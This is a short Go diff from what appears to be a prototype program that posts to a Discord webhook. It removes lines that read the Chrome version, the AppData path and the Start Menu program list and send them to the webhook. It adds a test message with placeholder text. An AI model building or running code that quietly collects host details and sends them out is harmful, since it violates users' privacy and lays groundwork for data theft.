@@ -2,31 +2,30 @@ package main
 
 import (
 	"encoding/json"
-	"os"
 	"strconv"
 	"strings"
 )
 
 func main() {
-	//data := makeWebhookString()
-	//webhook(data)
-	//data, _ := os.Getwd()\
-	// println(existsFromC("C://Program Files"))
-	// println(isWindows())
-	output, err := getChromeVersion()
-	if err != nil {
-		println(err.Error())
-	}
-	println(output)
-	println(appdataPath())
-	out, _ := os.ReadDir(startMenuPath())
-	sb := strings.Builder{}
-	for _, e := range out {
-		sb.WriteString(e.Name())
-		sb.WriteString("\n")
-	}
-	webhook(makeWebhookString())
-	webhook(sb.String())
+	//output, err := getChromeVersion()
+	//if err != nil {
+	//	println(err.Error())
+	//}
+	//println(output)
+	//println(appdataPath())
+	//out, _ := os.ReadDir(startMenuPath())
+	//sb := strings.Builder{}
+	//for _, e := range out {
+	//	sb.WriteString(e.Name())
+	//	sb.WriteString("\n")
+	//}
+	embed := Embed{"fasdf", "asdfff", "", Footer{}}
+
+	embeds := Embeds{embeds: []Embed{embed}}
+	dm := DiscordMessage{"Why tho", embeds, Footer{}, Author{}}
+	println(dm.String())
+	webhook(dm.String())
+
 }
 
 func makeWebhookString() string {
